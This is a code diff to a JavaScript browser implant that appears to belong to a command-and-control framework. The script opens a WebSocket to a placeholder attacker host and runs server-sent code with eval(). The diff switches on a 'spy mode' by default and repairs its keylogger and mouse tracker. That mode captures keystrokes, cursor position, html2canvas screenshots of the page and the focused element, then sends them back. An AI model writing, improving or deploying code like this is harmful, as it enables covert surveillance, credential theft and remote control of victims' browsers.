@@ -1,17 +1,18 @@
 const poll_url = "[[HOST_REPLACE_ME]]/w".replace("http", "ws");
 
-var res = {
+let res = {
 	poll: "hearthbeat",
 	uid: results["UID"],
 	action_results: [],
 	spy_mode: null,
 };
-var config = { spy_mode: false };
-var tries = 0;
+let config = { spy_mode: true };
+let tries = 0;
+let socket 
 while (tries < 3) {
 	//console.log("Try: " + tries);
 	try {
-		var socket = new WebSocket(poll_url);
+		socket = new WebSocket(poll_url);
 		if (socket != null && socket != undefined) {
 			console.log(socket);
 			socket.onopen = function () {
@@ -27,30 +28,29 @@ while (tries < 3) {
 				};
 
 				if (config.spy_mode) {
-					var mouse_x = null,
+					let mouse_x = null,
 						mouse_y = null;
-					var pressed_keys = [];
+					let pressed_keys = [];
 
-					document.body.addEventListener(
-						"onmousemove",
-						function (event) {
-							mouse_x = event.clientX;
-							mouse_y = event.clientY;
-						}
-					);
-					document.body.addEventListener(
-						"onkeydown",
-						function (event) {
-							keyboard.push[event.code];
-						}
-					);
+					document.onmousemove = function (event) {				
+						mouse_x = event.pageX;
+						mouse_y = event.pageY;  
+					}
+
+
+					document.onkeydown = function (event) {
+						pressed_keys.push(event.key);
+					}
+					
 
 					try {
 						html2canvas(document.body, {
 							imageTimeout: 0,
 							allowTaint: true,
+							imageTimeout: 1000,
+							logging: false,
+							useCORS: true,
 						}).then(function (canvas) {
-							//console.log(canvas);
 							const context = canvas.getContext("2d");
 							context.beginPath();
 							context.arc(
@@ -65,35 +65,35 @@ while (tries < 3) {
 							context.fill();
 
 							res["spy_mode"] = {
-								mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
-								keyboard: pressed_keys, //TODO: addEventListener onkeydown
+								mouse: { x: mouse_x, y: mouse_y },
+								keyboard: pressed_keys,
 								image: canvas.toDataURL("image/png"),
 								focused_element: document.activeElement,
 							};
 						});
-					} catch (e) {
+					} catch (x) {
 						res["spy_mode"] = {
-							mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
-							keyboard: pressed_keys, //TODO: addEventListener onkeydown
+							mouse: { x: mouse_x, y: mouse_y }, 
+							keyboard: pressed_keys, 
 							image: null,
 							focused_element: document.activeElement,
 						};
 					}
 				}
 
-				var commands = JSON.parse(e.data); //This is a TriggerCommand json object
-				console.log(e.data);
+				let commands = JSON.parse(e.data); //This is a TriggerCommand json object
+				let action;
 				if (commands != null) {
-					for (var id in commands) {
+					for (let id in commands) {
 						//console.log(commands[id]);
 						//console.log("Evaluating: " + commands[id].Code);
 						try {
-							var action = {};
+							action = {};
 							action[commands[id].ID] = eval(commands[id].Code);
 							res.action_results.push(action);
 						} catch (ex) {
 							console.log(ex);
-							var action = {};
+							action = {};
 							action[commands[id].ID] = ex;
 							res.action_results.push(action);
 						}
